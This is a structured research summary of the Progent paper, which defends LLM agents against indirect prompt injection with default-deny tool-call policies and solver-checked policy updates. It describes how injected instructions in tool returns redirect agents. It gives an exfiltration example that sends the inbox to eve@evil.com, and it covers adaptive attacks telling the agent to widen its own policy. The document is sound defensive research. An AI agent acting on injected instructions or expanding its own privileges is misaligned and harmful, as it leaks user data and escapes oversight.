@@ -1,0 +1,127 @@
+---
+canonical_key: arxiv-2504.11703
+version_key: v1
+title: 'Progent: Securing AI Agents with Privilege Control'
+authors:
+- Tianneng Shi
+- Jingxuan He
+- Zhun Wang
+- Hongwei Li
+- Linyu Wu
+- Wenbo Guo
+- Dawn Song
+venue: arXiv
+year: 2025
+tags:
+- tde-related-work
+- tool-use
+- verifier
+topic_groups:
+- agent_harness
+triage_label: SKIM
+triage_confidence: high
+source_link: https://arxiv.org/abs/2504.11703v3
+summary_date: '2026-08-13'
+curated_by: Huch0
+contributors:
+- Huch0
+---
+
+<TLDR>Progent secures LLM agents by compiling each user task into a symbolic least-privilege policy over tool names and arguments, deterministically allow/deny-gating every tool call against it (default-deny), and accepting LLM-proposed policy updates only after an SMT solver classifies them as narrowings (auto-applied) or expansions (approval-required) — so the agent's effective action space can never silently grow.</TLDR>
+
+<WhyItMatters>This is the security-side mirror of TDE: it also compiles natural language into machine-checkable predicates and keeps the LLM out of the enforcement decision (LLM proposes, symbolic matcher + SMT solver dispose — "no LLM in the decision loop", §11). But its predicates are least-privilege preconditions on the *action interface* — which calls may be issued, evaluated on the call's own arguments, never on environment state — and the execution loop keeps the vanilla "task solved" exit untouched: no postconditions over final world state, no completion oracle, no red–green iteration. Progent gates what the agent *may do*; TDE gates whether the task *is done* — complementary layers (safety envelope vs acceptance suite), and the formalized version of the ad-hoc permission systems production agent harnesses already ship.</WhyItMatters>
+
+<KeyStats items={[
+  { value: "39.9%→1.0%", label: "ASR on AgentDojo", sub: "gpt-4o, worst-case auto-approve (Fig.3)" },
+  { value: "70.3%→3.9%", label: "ASR on ASB", sub: "fully automated policies (Fig.4)" },
+  { value: "6%", label: "of policy updates need approval", sub: "rest are auto-applied narrowings (§8.2)" },
+  { value: "0.0%", label: "ASR with human review", sub: "Manual Approval config (Fig.5)" },
+]} />
+
+## Motivation
+Agents act on the world exclusively through tool calls, and <Problem>indirect prompt injection turns that channel against the user: instructions planted in environment data ride back through tool returns and redirect the agent into unauthorized calls</Problem> — in the running example, `send_email(to=eve@evil.com, body=(inbox))` exfiltrates the inbox while the benign task still completes, so the user may never notice (§2.1, p.2). Securing this is hard for three stated reasons: (I) <Problem>agent behavior is non-deterministic, while security demands enforcement that holds regardless of how the LLM reasons</Problem>; (II) security requirements depend on both the task and the evolving execution context (only after a lookup does the agent learn the Slack handle is `alice`, which should then bind future recipients); (III) <Problem>legitimate and adversarial privilege expansions arrive through the same channel</Problem> — a returned TODO legitimately requires new tools, and an injection demands them the same way. Prior defenses fall short: <Problem>prompt-hardening and guardrail detectors are probabilistic and generalize poorly (high false positives and negatives on AgentDojo)</Problem>, and <Problem>tool-level filtering ignores arguments, so it either blocks a whole tool (utility loss) or allows it entirely (attack success)</Problem> (§8.1, p.8).
+
+## Contribution (what's new)
+<Novelty>Enforce least privilege at the tool-call boundary — the one interface that is both structured (names + typed arguments) and complete (every external effect passes through it) — so security checking can be deterministic even though the agent is not</Novelty> (§2.2). Policies are symbolic allow/forbid rules with argument conditions; a default-deny matcher gates every call. Because per-task, per-step policies cannot be hand-written, an LLM generates and updates them — which would reinject non-determinism. Hence the second delta: <Novelty>the LLM only *proposes*; a Z3-decided comparison classifies every update as a narrowing (auto-applied) or an expansion (explicit approval required), yielding a proved monotonic-confinement guarantee: between approvals the allowed action set can only shrink, so a manipulated or hallucinating policy LLM cannot silently escalate privileges</Novelty> (§4.3, §6). <Related>Conseca and DRIFT also LLM-generate agent policies, but without deterministic verification of updates</Related> — the SMT expansion check is precisely the stated differentiator (§10).
+
+## Research questions
+Can deterministic, argument-level privilege control block injection-induced tool calls without breaking benign task completion? Are LLMs good enough to generate and update least-privilege policies automatically? How much security does each component contribute (initial policy, update mechanism, approver), and does the defense hold up across models, real-world frameworks, multi-agent systems, and adaptive attacks?
+
+## Methodology
+A policy module sits between the (black-box) agent and its tools. At each step the current policy deterministically allows or blocks the issued call; blocked calls return a fallback message naming the reason and restating the task, so the agent adjusts and continues. The initial policy is LLM-generated from the trusted user query; after each tool return an LLM may propose an update, which the SMT check classifies before it takes effect.
+
+<Pass title="Method details">
+<Stepper steps={[
+  { title: "Policy DSL (§4.1, Fig.2b)", body: "A policy is a list of rules: an effect (allow or forbid) targeting one tool, a conjunction of boolean conditions over the call's typed arguments — comparisons, membership, array length, member access, regex match — and a fallback. Fallbacks: terminate execution, request user inspection, or return an error message; the default returns a message naming the violated condition plus the original task, so the agent self-corrects and continues." },
+  { title: "Deterministic enforcement (§4.2, Alg.2)", body: "Collect the rules targeting the called tool, evaluate forbid rules before allow rules, substitute the concrete argument values into each rule's conditions, and apply the first rule that fires. If no rule matches, the call is blocked by default — unlisted tools are unusable." },
+  { title: "SMT comparison (§4.3)", body: "Define a policy's allowed set as all tool calls it leaves unchanged. An update is a narrowing iff the new allowed set is contained in the old one; per tool, this reduces to the validity of an implication between two quantified boolean formulas over the argument space, decided by Z3. Anything else is an expansion." },
+  { title: "Execution loop (§5, Alg.3)", body: "Initialize the policy from the trusted user query. After each tool return, a first LLM pass decides whether an update is needed using only the tool set, user query, and the tool call — the untrusted result is withheld at this stage. If needed, a second pass drafts the candidate policy from full context; narrowings apply automatically, expansions go to the approver (auto-deny, auto-approve, per-tool rules, or human review)." },
+  { title: "Deployment (§7)", body: "Policies are JSON Schema documents (LLMs emit them without fine-tuning), matched with the jsonschema library; Z3 for comparison. Generic policies — manually written, task-independent, priority-layered — are checked first and cannot be overridden by task policies (Generic Confinement, Alg.4). Integration: library mode (LangChain middleware, OpenAI Agents SDK wrapper) or proxy mode (repoint LLM/MCP endpoints, zero agent-code changes)." },
+]} />
+
+<MathBlock>{`\\mathcal{A}(P) = \\{\\, c \\mid P(c) = c \\,\\}, \\qquad P' \\text{ narrows } P \\iff \\mathcal{A}(P) \\supseteq \\mathcal{A}(P')`}</MathBlock>
+
+Monotonic confinement (§6): since every auto-applied update satisfies `A(P') ⊆ A(P)`, the allowed-call sets form a monotonically decreasing sequence `A(P0) ⊇ A(P1) ⊇ A(P2) ⊇ …` between approved expansions.
+</Pass>
+
+## Main result
+On AgentDojo (gpt-4o as both agent and policy LLM, worst-case auto-approve), <Finding src="Fig.3, p.9">Progent cuts ASR from 39.9% (no defense) to 1.0% while roughly preserving benign-task utility (79.4→76.3 no-attack) and *raising* utility under attack (54.0→61.3)</Finding> — blocking the hijack keeps the agent on-task. Every prior defense either leaves ASR above 6% or pays heavily in utility:
+
+<SortableTable columns={["Defense", "Utility no-attack", "Utility under attack", "ASR %"]} rows={[
+  ["No defense", 79.4, 54.0, 39.9],
+  ["repeat_user_prompt", 83.5, 68.4, 25.1],
+  ["transformers_pi_detector", 73.2, 61.5, 23.3],
+  ["spotlighting_with_delimiting", 66.0, 61.3, 6.3],
+  ["DataSentinel", 37.1, 18.5, 8.2],
+  ["tool_filter", 65.0, 39.4, 21.4],
+  ["Llama Prompt Guard 2", 79.4, 39.2, 24.1],
+  ["Progent", 76.3, 61.3, 1.0],
+]} />
+
+On ASB, <Finding src="Fig.4, p.9">ASR drops from 70.3% to 3.9% with utility essentially unchanged (78.2→78.2 no-attack, 71.1→69.7 under attack), while ASB's own prompt-based defenses leave ASR at 66.6–73.1%</Finding>; <Finding src="§8.1, p.9">manually written policies with human insight provably reduce ASB's ASR to 0%</Finding>.
+
+## Key findings
+- <Finding src="Fig.5, §8.2">The initial policy alone does most of the work: with updates disabled, ASR falls from 39.9% to 2.5%</Finding> — compiling the trusted user query into a default-deny policy is already a strong defense; enabling updates then recovers utility (70.1→76.3 no-attack) and further lowers ASR to 1.0%, because narrowings bind runtime facts such as recipients.
+- <Finding src="Fig.5, §8.2">Approver configurations trace the automation–security frontier: Auto-Deny 0.7%, Auto-Approve 1.0%, Manual Approval 0.0% ASR</Finding>; only 6% of updates are expansions, so even human-in-the-loop approval stays cheap.
+- <Finding src="Fig.6, Fig.7">Robust across models: all four policy LLMs keep ASR below 5% (best 1.0% with gpt-4o), and across five agent LLMs Progent yields 0.3–1.0% ASR</Finding>; it stacks with safety-trained models (claude-sonnet-4 6.8%→0.5%, Meta-SecAlign-70B 4.8%→0.3%) — a defense-in-depth layer blocking about 90% of the attacks those models still miss.
+- <Finding src="Fig.8, §8.3">It transfers to real frameworks via an MCP migration of AgentDojo: LangChain 32.6%→1.2%, OpenAI Agents SDK 40.4%→0.8%, OpenHands (proxy mode) 42.0%→1.4%, AutoGen multi-agent 18.7%→0.8% ASR</Finding>; multi-agent isolation alone already roughly halves ASR relative to single agents, at a utility cost.
+- <Finding src="Fig.10, App.E">Adaptive attacks that target the policy updater itself gain little: 0.5–4.2% ASR even with all expansions auto-approved</Finding> (simulating a security-unaware user); the strongest variant explicitly instructs the agent to update the policy to permit the attack tools.
+- <Finding src="§8.1, p.9">ASB's residual 3.9% comes from attack tools whose names and descriptions are nearly indistinguishable from task-relevant benign tools</Finding> — the authors argue even humans could not tell them apart without prior knowledge of which tools are trusted.
+
+## Implications
+Progent gives agent security the shape of classical authorization — <Related>policy-language lineage: Binder, Cedar, cloud IAM</Related> — adapted to open-ended agent tasks by making an LLM the policy author under deterministic update control. Against <Related>system-level defenses (IsolateGPT, f-secure, FIDES taint tracking, AirgapAgent, CaMeL — which requires rewriting the agent's architecture)</Related> its pitch is non-intrusiveness plus a formal guarantee; against <Related>guardrail detectors (DeBERTa-based, DataSentinel, Llama Prompt Guard 2)</Related> it substitutes deterministic enforcement for probabilistic detection that fails to generalize. The transferable idea is the "LLM proposes, solver disposes" discipline: <FollowUp>apply the same monotone-update rule to other runtime artifacts — e.g., compiled acceptance suites or contracts, which should also never silently weaken</FollowUp>. <FollowUp>The MCP-based AgentDojo migration is a reusable testbed for real-world agent-security evaluation</FollowUp>. <FollowUp>Extending policies to GUI/multimodal actions (e.g., constraining clickable screen regions) for computer-use agents is named future work (§9)</FollowUp>.
+
+## Limitations
+- <Caveat>Guarantees are conditional on the user/approver: incorrectly approved expansions or ambiguous initial tasks can exceed least privilege</Caveat> — author-stated (§9), mitigated but not eliminated by the adaptive-attack evaluation.
+- <Caveat>Out of scope by construction: attacks that stay within least privilege (e.g., preference manipulation among valid options) and attacks on text outputs that trigger no tool call</Caveat> (§3.2, §9).
+- <Caveat>Text-only tool calls: no GUI/multimodal agents (clicking coordinates or icons)</Caveat>; policies over screen regions are future work (§9) — so today's computer-use agents are uncovered.
+- <Caveat>Proxy mode cannot protect built-in tools that bypass external MCP interfaces</Caveat>; library mode can, but needs code changes — a stated deployability-vs-depth trade-off (§9).
+- <Caveat>0% ASR requires manual effort (human approval on AgentDojo, hand-written policies on ASB); the fully automated pipeline leaves 1.0%/3.9% residual</Caveat>.
+- <Caveat>Not reported: runtime overhead (up to two extra LLM calls per step plus SMT solving), token cost, latency, and any seed/variance information</Caveat> — all results are single-run point estimates.
+- <Caveat>Evaluation is AgentDojo-centric</Caveat>: the "real-world" benchmark is an MCP migration of AgentDojo, with two preference-attack tasks excluded and one Slack task manually re-graded (App.D) — each justified, but evaluator-controlled.
+
+## Critiques and Questions
+1. The headline 1.0% is measured under Auto-Approve, where every expansion is granted — in that configuration the SMT gate blocks nothing, so the deterministic mechanism contributes no security and the number instead certifies the *LLM updater's* empirical robustness (result-blind update gating plus alignment). The formal monotonic-confinement guarantee is load-bearing only under Auto-Deny (0.7%) or human approval (0.0%); the abstract's "prevents silent privilege escalation" quietly assumes a non-vacuous approver.
+2. Argument-level predicates cannot see content or provenance: an allowed `send_email(to=alice@example.com, body=*)` can still exfiltrate secrets gathered earlier via the unconstrained body. Such within-privilege attacks are excluded by the threat model, so "unauthorized" is defined by policy expressiveness, not user intent.
+3. How close are LLM-generated initial policies to true least privilege? The utility drop with updates disabled (79.4→70.1) shows over-restriction happens; over-permissiveness is never measured directly, only inferred from downstream ASR.
+4. The 6% approval rate is per-update, not per-task; the realistic interruption burden and how ordinary users would decide are unmeasured, and the Manual Approval result assumes a user with strong security awareness (App.D).
+
+<SelfCheck q="Why does Progent split policy updating into two LLM sub-steps, deciding whether an update is needed before seeing the tool-call result?" a="The update-needed decision is made only from trusted or structured inputs (tool set, user query, the tool call itself), so injected content in the result cannot even trigger the update path. Only if an update is deemed necessary does the LLM see the untrusted result to draft the candidate policy — and any expansion it then proposes is caught by the deterministic SMT comparison and routed to approval, so a manipulated updater still cannot silently escalate privileges." />
+
+## Glossary
+- <Term def="attack that plants instructions in environment data (emails, web pages) so they enter the agent via tool returns and redirect its actions">indirect prompt injection</Term>
+- <Term def="allow only the actions essential for the task and block everything else; Progent enforces it with default-deny matching">principle of least privilege</Term>
+- <Term def="Progent's proved property: between explicitly approved expansions, the set of allowed tool calls can only shrink">monotonic confinement</Term>
+- <Term def="satisfiability-modulo-theories solver (Z3 here); decides whether one symbolic policy admits a superset of another's tool calls">SMT solver</Term>
+- <Term def="prompt-injection benchmark with banking/Slack/travel/workspace suites and environment-injected attacks (Debenedetti et al. 2024)">AgentDojo</Term>
+- <Term def="Agent Security Bench: ten agent scenarios and five attack templates (Zhang et al. 2025)">ASB</Term>
+- <Term def="attack success rate: fraction of injection attempts that achieve the attacker's goal">ASR</Term>
+- <Term def="Model Context Protocol, a standard interface for exposing tools to agents; used here to migrate AgentDojo into a framework-agnostic testbed">MCP</Term>
+- <Term def="manually written, task-independent rules (e.g., org-wide data governance) composed above task policies with strict priority">generic policy</Term>
+
+{/* NOTES_START */}
+### Personal notes
+TDE positioning: the cleanest category-C comparator — deterministic gating of tool calls on symbolic predicates, LLM excluded from the enforcement decision. The sharp boundary for the novelty defense: Progent's predicates are evaluated on the call's own arguments against policy state (never environment-evaluated), they are *permission* preconditions, and nothing in Algorithm 3 checks completion — the vanilla "task solved" exit survives untouched. TDE's delta: environment-evaluated pre/postconditions plus a final-state acceptance suite as completion oracle with red–green iteration. Worth borrowing: the monotone-update discipline (narrow auto, expand only with approval) for acceptance-suite evolution at runtime.
+
+Version note: this is arXiv v3 (14 May 2026). The TDE survey's "ASR driven to 0% on AgentDojo/ASB/AgentPoison" matches the earlier version's claims; v3 drops AgentPoison entirely and reports 1.0%/3.9% for automated configs — 0% only with Manual Approval (AgentDojo) or hand-written policies (ASB).
+{/* NOTES_END */}
